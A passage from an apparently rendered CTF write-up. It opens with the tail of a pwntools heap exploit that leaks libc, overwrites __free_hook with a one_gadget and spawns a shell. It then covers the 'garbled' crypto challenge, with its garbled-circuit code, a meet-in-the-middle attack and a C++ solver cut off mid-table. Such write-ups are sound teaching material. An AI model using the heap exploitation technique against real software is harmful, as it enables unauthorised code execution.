r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a\x0a</span><span style="color:#e6db74">&#34;</span>)
libc_base <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;puts&#34;</span>]
success(<span style="color:#e6db74">&#34;libc_base : &#34;</span> <span style="color:#f92672">+</span> hex(libc_base))
free_hook <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__free_hook&#34;</span>]
success(<span style="color:#e6db74">&#34;free_hook : &#34;</span> <span style="color:#f92672">+</span> hex(free_hook))
one_gadget <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4f3c2</span>
success(<span style="color:#e6db74">&#34;one_gadget : &#34;</span> <span style="color:#f92672">+</span> hex(one_gadget))

<span style="color:#75715e"># 0x404040 -&gt; 0x404158 -&gt; 0x59f260 -&gt; 0x404020 -&gt; puts_got -&gt; ...</span>
add(<span style="color:#ae81ff">0</span>,p64(<span style="color:#ae81ff">0xdeadbeef</span>))

<span style="color:#75715e"># 0x404158 -&gt; 0x59f260 -&gt; 0x404040 -&gt; 0xdeadbeef</span>
add(<span style="color:#ae81ff">0</span>,p64(free_hook))

<span style="color:#75715e"># 0x59f260 -&gt; 0x404158 -&gt; free_hook</span>
add(<span style="color:#ae81ff">0</span>,p64(<span style="color:#ae81ff">0xdeadbeef</span>))

<span style="color:#75715e"># 0x404158 -&gt; free_hook -&gt; 0x59f260 -&gt; 0xdeadbeef</span>
add(<span style="color:#ae81ff">0</span>,p64(free_hook))

<span style="color:#75715e"># free_hook -&gt; 0x404158 -&gt; free_hook -&gt; ...</span>
add(<span style="color:#ae81ff">0</span>,p64(one_gadget))

flip() <span style="color:#75715e"># get shell</span>

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><h2 id="crypto">Crypto</h2>
<h3 id="garbled">garbled</h3>
<p>This writeup is referenced from <a href="https://www.josephsurin.me/posts/2021-02-08-dicectf-2021-garbled">Joseph</a></p>
<h4 id="analysis-2">Analysis</h4>
<p>This is a <code>Garbled Circuit</code> challenge. We should recover the <code>inputs</code> to get flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># obtain_flag.py</span>
<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">once you&#39;ve found the input labels which make the circuit return `true`,
</span><span style="color:#e6db74">then concatenate them together, hash them,
</span><span style="color:#e6db74">and xor with the provided string to obtain the flag
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

<span style="color:#f92672">import</span> hashlib
<span style="color:#f92672">import</span> json

<span style="color:#f92672">from</span> yao <span style="color:#f92672">import</span> evaluate_circuit
<span style="color:#f92672">from</span> public_data <span style="color:#f92672">import</span> g_tables
<span style="color:#f92672">from</span> private_data <span style="color:#f92672">import</span> keys, flag


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(A, B):
    <span style="color:#66d9ef">return</span> bytes(a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(A, B))


<span style="color:#75715e">##########################################################</span>


circuit_filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;circuit.json&#34;</span>
<span style="color:#66d9ef">with</span> open(circuit_filename) <span style="color:#66d9ef">as</span> json_file:
    circuit <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(json_file)
    

<span style="color:#75715e"># ?????????????????</span>
inputs <span style="color:#f92672">=</span> {
 <span style="color:#ae81ff">1</span>: <span style="color:#960050;background-color:#1e0010">?????????????????</span>,
 <span style="color:#ae81ff">2</span>: <span style="color:#960050;background-color:#1e0010">?????????????????</span>,
 <span style="color:#ae81ff">3</span>: <span style="color:#960050;background-color:#1e0010">?????????????????</span>,
 <span style="color:#ae81ff">4</span>: <span style="color:#960050;background-color:#1e0010">?????????????????</span>
}


evaluation <span style="color:#f92672">=</span> evaluate_circuit(circuit, g_tables, inputs)

<span style="color:#75715e"># circuit should return `true`</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> circuit[<span style="color:#e6db74">&#39;outputs&#39;</span>]:
    <span style="color:#66d9ef">assert</span> evaluation[i] <span style="color:#f92672">==</span> keys[i][<span style="color:#ae81ff">1</span>]


<span style="color:#75715e">##########################################################</span>


msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{}:{}:{}:{}&#34;</span><span style="color:#f92672">.</span>format(inputs[<span style="color:#ae81ff">1</span>], inputs[<span style="color:#ae81ff">2</span>], inputs[<span style="color:#ae81ff">3</span>], inputs[<span style="color:#ae81ff">4</span>])
msg <span style="color:#f92672">=</span> msg<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>)

m <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha512()
m<span style="color:#f92672">.</span>update(msg)
m<span style="color:#f92672">.</span>digest()

xor_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">),u</span><span style="color:#ae81ff">\x1b\x1d</span><span style="color:#e6db74">E:</span><span style="color:#ae81ff">\xa8</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\x91</span><span style="color:#e6db74">}&amp;</span><span style="color:#ae81ff">\xc7\x90\xbb\xce</span><span style="color:#e6db74">]</span><span style="color:#ae81ff">\xf5\x17\x89\xd7\xfa\x07\x86\x83\xfa\x9b</span><span style="color:#e6db74">^</span><span style="color:#ae81ff">\xcb\xd7</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">W</span><span style="color:#ae81ff">\xca\xce</span><span style="color:#e6db74">XD7&#39;</span>


<span style="color:#66d9ef">print</span>( xor(m<span style="color:#f92672">.</span>digest(), xor_flag) )

<span style="color:#66d9ef">assert</span> xor(m<span style="color:#f92672">.</span>digest(), xor_flag) <span style="color:#f92672">==</span> flag
</code></pre></div><p>The <code>circuit</code> is as follow:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
    <span style="color:#f92672">&#34;inputs&#34;</span> : [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>],
    <span style="color:#f92672">&#34;outputs&#34;</span>   : [<span style="color:#ae81ff">7</span>],
    <span style="color:#f92672">&#34;gates&#34;</span> : [
        {<span style="color:#f92672">&#34;id&#34;</span> : <span style="color:#ae81ff">5</span>, <span style="color:#f92672">&#34;type&#34;</span> : <span style="color:#e6db74">&#34;AND&#34;</span>, <span style="color:#f92672">&#34;in&#34;</span> : [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>]},
        {<span style="color:#f92672">&#34;id&#34;</span> : <span style="color:#ae81ff">6</span>, <span style="color:#f92672">&#34;type&#34;</span> : <span style="color:#e6db74">&#34;AND&#34;</span>, <span style="color:#f92672">&#34;in&#34;</span> : [<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>]},
        {<span style="color:#f92672">&#34;id&#34;</span> : <span style="color:#ae81ff">7</span>, <span style="color:#f92672">&#34;type&#34;</span> : <span style="color:#e6db74">&#34;AND&#34;</span>, <span style="color:#f92672">&#34;in&#34;</span> : [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>]}
    ]
}
</code></pre></div><p>The <code>g_tables</code> is as follow:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">g_tables <span style="color:#f92672">=</span> {<span style="color:#ae81ff">5</span>: [(<span style="color:#ae81ff">5737111</span>, <span style="color:#ae81ff">2983937</span>),
  (<span style="color:#ae81ff">15406556</span>, <span style="color:#ae81ff">16284948</span>),
  (<span style="color:#ae81ff">14172222</span>, <span style="color:#ae81ff">14132908</span>),
  (<span style="color:#ae81ff">4000971</span>, <span style="color:#ae81ff">16383744</span>)],
 <span style="color:#ae81ff">6</span>: [(<span style="color:#ae81ff">8204186</span>, <span style="color:#ae81ff">1546264</span>),
  (<span style="color:#ae81ff">229766</span>, <span style="color:#ae81ff">3208405</span>),
  (<span style="color:#ae81ff">9550202</span>, <span style="color:#ae81ff">13483954</span>),
  (<span style="color:#ae81ff">13257058</span>, <span style="color:#ae81ff">5195482</span>)],
 <span style="color:#ae81ff">7</span>: [(<span style="color:#ae81ff">1658768</span>, <span style="color:#ae81ff">11512735</span>),
  (<span style="color:#ae81ff">1023507</span>, <span style="color:#ae81ff">9621913</span>),
  (<span style="color:#ae81ff">7805976</span>, <span style="color:#ae81ff">1206540</span>),
  (<span style="color:#ae81ff">2769364</span>, <span style="color:#ae81ff">9224729</span>)]}
</code></pre></div><p>The <code>evaluate_circuit</code> function is in <code>yao.py</code>, it uses the <code>circuit</code>, <code>g_tables</code> and <code>inputs</code> to update the <code>keys</code> and <code>evaluated</code> the <code>gates</code>, and the <code>evaluate_gate</code> function use <code>decrypt</code> function to get <code>lable</code> and <code>validation</code>, if <code>validation == 0</code> it will return the <code>label</code>, if no <code>label</code> return it will rasie an error.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># yao.py</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">evaluate_gate</span>(garbled_table, key0, key1):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Return the output label unlocked by the two input labels,
</span><span style="color:#e6db74">    or raise a ValueError if no entry correctly decoded
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> g <span style="color:#f92672">in</span> garbled_table:
        gl, v <span style="color:#f92672">=</span> g
        label <span style="color:#f92672">=</span> decrypt(gl, key0, key1)
        validation <span style="color:#f92672">=</span> decrypt(v, key0, key1)
        
        <span style="color:#66d9ef">if</span> validation <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">return</span> label
        
    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;None of the gates correctly decoded; invalid input labels&#34;</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">evaluate_circuit</span>(circuit, g_tables, inputs):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Evaluate yao circuit with given inputs.
</span><span style="color:#e6db74">    
</span><span style="color:#e6db74">    Keyword arguments:
</span><span style="color:#e6db74">    circuit   -- dict containing circuit spec
</span><span style="color:#e6db74">    g_tables  -- garbled tables of yao circuit
</span><span style="color:#e6db74">    inputs  -- dict mapping wires to labels
</span><span style="color:#e6db74">    
</span><span style="color:#e6db74">    Returns:
</span><span style="color:#e6db74">    evaluation -- a dict mapping output wires to the result labels
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    gates        <span style="color:#f92672">=</span> circuit[<span style="color:#e6db74">&#34;gates&#34;</span>] <span style="color:#75715e"># dict containing circuit gates</span>
    wire_outputs <span style="color:#f92672">=</span> circuit[<span style="color:#e6db74">&#34;outputs&#34;</span>]   <span style="color:#75715e"># list of output wires</span>
    wire_inputs  <span style="color:#f92672">=</span> {}               <span style="color:#75715e"># dict containing Alice and Bob inputs</span>
    evaluation   <span style="color:#f92672">=</span> {}               <span style="color:#75715e"># dict containing result of evaluation</span>

    wire_inputs<span style="color:#f92672">.</span>update(inputs)
    
    <span style="color:#75715e"># Iterate over all gates</span>
    <span style="color:#66d9ef">for</span> gate <span style="color:#f92672">in</span> sorted(gates, key<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> g: g[<span style="color:#e6db74">&#34;id&#34;</span>]):
        gate_id, gate_in <span style="color:#f92672">=</span> gate[<span style="color:#e6db74">&#34;id&#34;</span>], gate[<span style="color:#e6db74">&#34;in&#34;</span>]

        key0 <span style="color:#f92672">=</span> wire_inputs[gate_in[<span style="color:#ae81ff">0</span>]]
        key1 <span style="color:#f92672">=</span> wire_inputs[gate_in[<span style="color:#ae81ff">1</span>]]
        
        garbled_table <span style="color:#f92672">=</span> g_tables[gate_id]
        msg <span style="color:#f92672">=</span> evaluate_gate(garbled_table, key0, key1)
        
        wire_inputs[gate_id] <span style="color:#f92672">=</span> msg

    <span style="color:#75715e"># After all gates have been evaluated, we populate the dict of results</span>
    <span style="color:#66d9ef">for</span> out <span style="color:#f92672">in</span> wire_outputs:
        evaluation[out] <span style="color:#f92672">=</span> wire_inputs[out]

    <span style="color:#66d9ef">return</span> evaluation

</code></pre></div><p>The <code>decrypt</code> function is in <code>block_cipher.py</code>, it is an easy <code>SPN block cipher</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># block_cipher.py</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">S</span>(block, SBoxes):
    output <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(SBoxes)):
        output <span style="color:#f92672">|=</span> SBoxes[i][(block <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i

    <span style="color:#66d9ef">return</span> output

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">permute</span>(block, pbox):
    output <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">24</span>):
        bit <span style="color:#f92672">=</span> (block <span style="color:#f92672">&gt;&gt;</span> pbox[i]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>
        output <span style="color:#f92672">|=</span> (bit <span style="color:#f92672">&lt;&lt;</span> i)
    <span style="color:#66d9ef">return</span> output

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_data</span>(block, key):
    
    block <span style="color:#f92672">^=</span> key
    
    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>):
        block <span style="color:#f92672">=</span> permute(block, PInvBox)
        block <span style="color:#f92672">=</span> S(block, SInvBoxes)
        block <span style="color:#f92672">^=</span> key

    <span style="color:#66d9ef">return</span> block

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(data, key1, key2):
    decrypted <span style="color:#f92672">=</span> decrypt_data(data, key2)
    decrypted <span style="color:#f92672">=</span> decrypt_data(decrypted, key1)
    <span style="color:#66d9ef">return</span> decrypted
</code></pre></div><p>So we can know the <code>inputs</code> is <code>24-bit</code>. But these infomations are not enough for us to solve this challenge.
Let take a look at <code>evaluate_garbled_circuit_example.py</code>, it gives us an example:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74"># evaluate_garbled_circuit_example.py
</span><span style="color:#e6db74">This file is provided as an example of how to load the garbled circuit
</span><span style="color:#e6db74">and evaluate it with input key labels.
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Note: the ACTUAL `g_tables` for this challenge are in `public_data.py`, and are not used in this example.
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">It will error if the provided inputs are not valid label keys,
</span><span style="color:#e6db74">ie do not match either of the `keys` made by `generate_garbled_circuit.py`
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

<span style="color:#f92672">import</span> json

<span style="color:#f92672">from</span> yao <span style="color:#f92672">import</span> evaluate_circuit
<span style="color:#f92672">from</span> generate_garbled_circuit <span style="color:#f92672">import</span> g_tables, keys


circuit_filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;circuit.json&#34;</span>
<span style="color:#66d9ef">with</span> open(circuit_filename) <span style="color:#66d9ef">as</span> json_file:
    circuit <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(json_file)
        

inputs <span style="color:#f92672">=</span> {}
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> circuit[<span style="color:#e6db74">&#34;inputs&#34;</span>]:
    v <span style="color:#f92672">=</span> keys[i][<span style="color:#ae81ff">1</span>]
    inputs[i] <span style="color:#f92672">=</span> v

evaluation <span style="color:#f92672">=</span> evaluate_circuit(circuit, g_tables, inputs)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&#34;</span>)
<span style="color:#66d9ef">print</span>(evaluation)
</code></pre></div><p>The <code>generate_garbled_circuit.py</code> is as follows, it use <code>GarbledCircuit</code> and <code>circuit</code> to generate the <code>g_tables</code> and <code>keys</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># generate_garbled_circuit.py</span>
<span style="color:#f92672">from</span> yao <span style="color:#f92672">import</span> GarbledCircuit
<span style="color:#f92672">import</span> json


circuit_filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;circuit.json&#34;</span>
<span style="color:#66d9ef">with</span> open(circuit_filename) <span style="color:#66d9ef">as</span> json_file:
    circuit <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(json_file)

<span style="color:#75715e"># creates a new garbled circuit each time</span>
gc <span style="color:#f92672">=</span> GarbledCircuit(circuit)

g_tables <span style="color:#f92672">=</span> gc<span style="color:#f92672">.</span>get_garbled_tables()
keys <span style="color:#f92672">=</span> gc<span style="color:#f92672">.</span>get_keys()


<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;g_tables = {}&#34;</span><span style="color:#f92672">.</span>format(repr(g_tables)))
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">keys = {}&#34;</span><span style="color:#f92672">.</span>format(repr(keys)))
</code></pre></div><p>And let take a look at <code>GarbledCircuit</code> and <code>GarbledGate</code> in <code>yao.py</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># yao.py</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">garble_label</span>(key0, key1, key2):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    key0, key1 = two input labels
</span><span style="color:#e6db74">    key2 = output label
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    gl <span style="color:#f92672">=</span> encrypt(key2, key0, key1)
    validation <span style="color:#f92672">=</span> encrypt(<span style="color:#ae81ff">0</span>, key0, key1)
    <span style="color:#66d9ef">return</span> (gl, validation)

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GarbledGate</span>:
    <span style="color:#e6db74">&#34;&#34;&#34;A representation of a garbled gate.
</span><span style="color:#e6db74">    Keyword arguments:
</span><span style="color:#e6db74">    gate  -- dict containing gate spec
</span><span style="color:#e6db74">    keys  -- dict mapping each wire to a pair of keys
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    <span style="color:#66d9ef">def</span> __init__(self, gate, keys):
        self<span style="color:#f92672">.</span>keys                <span style="color:#f92672">=</span> keys          <span style="color:#75715e"># dict of yao circuit keys</span>
        self<span style="color:#f92672">.</span>input               <span style="color:#f92672">=</span> gate[<span style="color:#e6db74">&#34;in&#34;</span>]    <span style="color:#75715e"># list of inputs&#39; ID</span>
        self<span style="color:#f92672">.</span>output              <span style="color:#f92672">=</span> gate[<span style="color:#e6db74">&#34;id&#34;</span>]    <span style="color:#75715e"># ID of output</span>
        self<span style="color:#f92672">.</span>gate_type           <span style="color:#f92672">=</span> gate[<span style="color:#e6db74">&#34;type&#34;</span>]  <span style="color:#75715e"># Gate type: OR, AND, ...</span>
        self<span style="color:#f92672">.</span>garbled_table       <span style="color:#f92672">=</span> {}            <span style="color:#75715e"># The garbled table of the gate</span>

        labels0 <span style="color:#f92672">=</span> keys[self<span style="color:#f92672">.</span>input[<span style="color:#ae81ff">0</span>]]
        labels1 <span style="color:#f92672">=</span> keys[self<span style="color:#f92672">.</span>input[<span style="color:#ae81ff">1</span>]]
        labels2 <span style="color:#f92672">=</span> keys[self<span style="color:#f92672">.</span>output]
        
        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>gate_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;AND&#34;</span>:
            self<span style="color:#f92672">.</span>garbled_table <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_gen_garbled_AND_gate(labels0, labels1, labels2)
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">NotImplementedError</span>(<span style="color:#e6db74">&#34;Gate type `{}` is not implemented&#34;</span><span style="color:#f92672">.</span>format(self<span style="color:#f92672">.</span>gate_type))


    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_gen_garbled_AND_gate</span>(self, labels0, labels1, labels2):
        <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">        labels0, labels1 = two input labels
</span><span style="color:#e6db74">        labels2 = output label
</span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
        key0_0, key0_1 <span style="color:#f92672">=</span> labels0
        key1_0, key1_1 <span style="color:#f92672">=</span> labels1
        key2_0, key2_1 <span style="color:#f92672">=</span> labels2
        
        G <span style="color:#f92672">=</span> []
        G<span style="color:#f92672">.</span>append(garble_label(key0_0, key1_0, key2_0))
        G<span style="color:#f92672">.</span>append(garble_label(key0_0, key1_1, key2_0))
        G<span style="color:#f92672">.</span>append(garble_label(key0_1, key1_0, key2_0))
        G<span style="color:#f92672">.</span>append(garble_label(key0_1, key1_1, key2_1))
        <span style="color:#75715e"># randomly shuffle the table so you don&#39;t know what the labels correspond to</span>
        shuffle(G)
        
        <span style="color:#66d9ef">return</span> G


    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_garbled_table</span>(self):
        <span style="color:#e6db74">&#34;&#34;&#34;Return the garbled table of the gate.&#34;&#34;&#34;</span>
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>garbled_table

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GarbledCircuit</span>:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    A representation of a garbled circuit.
</span><span style="color:#e6db74">    Keyword arguments:
</span><span style="color:#e6db74">    circuit -- dict containing circuit spec
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    <span style="color:#66d9ef">def</span> __init__(self, circuit):
        self<span style="color:#f92672">.</span>circuit        <span style="color:#f92672">=</span> circuit
        self<span style="color:#f92672">.</span>gates          <span style="color:#f92672">=</span> circuit[<span style="color:#e6db74">&#34;gates&#34;</span>]  <span style="color:#75715e"># list of gates</span>
        self<span style="color:#f92672">.</span>wires          <span style="color:#f92672">=</span> set()             <span style="color:#75715e"># list of circuit wires</span>

        self<span style="color:#f92672">.</span>keys           <span style="color:#f92672">=</span> {}  <span style="color:#75715e"># dict of keys</span>
        self<span style="color:#f92672">.</span>garbled_tables <span style="color:#f92672">=</span> {}  <span style="color:#75715e"># dict of garbled tables</span>

        <span style="color:#75715e"># Retrieve all wire IDs from the circuit</span>
        <span style="color:#66d9ef">for</span> gate <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>gates:
            self<span style="color:#f92672">.</span>wires<span style="color:#f92672">.</span>add(gate[<span style="color:#e6db74">&#34;id&#34;</span>])
            self<span style="color:#f92672">.</span>wires<span style="color:#f92672">.</span>update(set(gate[<span style="color:#e6db74">&#34;in&#34;</span>]))
        self<span style="color:#f92672">.</span>wires <span style="color:#f92672">=</span> list(self<span style="color:#f92672">.</span>wires)

        self<span style="color:#f92672">.</span>_gen_keys()
        self<span style="color:#f92672">.</span>_gen_garbled_tables()


    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_gen_keys</span>(self):
        <span style="color:#e6db74">&#34;&#34;&#34;Create pair of keys for each wire.&#34;&#34;&#34;</span>
        <span style="color:#66d9ef">for</span> wire <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>wires:
            self<span style="color:#f92672">.</span>keys[wire] <span style="color:#f92672">=</span> (
                    generate_random_label(),
                    generate_random_label()
                    )

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_gen_garbled_tables</span>(self):
        <span style="color:#e6db74">&#34;&#34;&#34;Create the garbled table of each gate.&#34;&#34;&#34;</span>
        <span style="color:#66d9ef">for</span> gate <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>gates:
            garbled_gate <span style="color:#f92672">=</span> GarbledGate(gate, self<span style="color:#f92672">.</span>keys)
            self<span style="color:#f92672">.</span>garbled_tables[gate[<span style="color:#e6db74">&#34;id&#34;</span>]] <span style="color:#f92672">=</span> garbled_gate<span style="color:#f92672">.</span>get_garbled_table()

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_garbled_tables</span>(self):
        <span style="color:#e6db74">&#34;&#34;&#34;Return dict mapping each gate to its garbled table.&#34;&#34;&#34;</span>
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>garbled_tables

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_keys</span>(self):
        <span style="color:#e6db74">&#34;&#34;&#34;Return dict mapping each wire to its pair of keys.&#34;&#34;&#34;</span>
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>keys
</code></pre></div><p>So we know the relationship between the <code>keys</code> and <code>g_tables</code>:
Assume the <code>input labels(keys)</code> are <code>[[a0,a1],[b0,b1]]</code>, and the <code>output lable(key)</code> is <code>[c0,c1]</code>, the <code>g_tables</code> are <code>[[l0,v0],[l1,v1],[l2,v2],[l3,v3]]</code>, so we can get:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">enc <span style="color:#f92672">=</span> [
    encrypt[c0,a0,b0],encrypt[<span style="color:#ae81ff">0</span>,a0,b0],
    encrypt[c0,a0,b1],encrypt[<span style="color:#ae81ff">0</span>,a0,b1],
    encrypt[c0,a1,b0],encrypt[<span style="color:#ae81ff">0</span>,a1,b0],
    encrypt[c1,a1,b1],encrypt[<span style="color:#ae81ff">0</span>,a1,b1],
    ]
[[l0,v0],[l1,v1],[l2,v2],[l3,v3]] <span style="color:#f92672">=</span> random_suffle(enc)
</code></pre></div><p>And the <code>Garbled Circuit</code> combine these <code>output lable</code> as <code>input lables</code> to generate more <code>output lable</code> until end.</p>
<p>We have the early <code>inputs lables</code> and <code>g_tables</code>, so we can use <code>MITM</code> to attack the <code>Garbled Circuit</code> with <code>validation</code>. And brute the order before <code>random suffle</code>. So we can recover the <code>keys</code> and finally get the flag.</p>
<h4 id="exp-2">Exp</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">// exp.c
</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;unordered_map&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;vector&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> SBoxes[<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> {{<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">10</span>}, {<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span 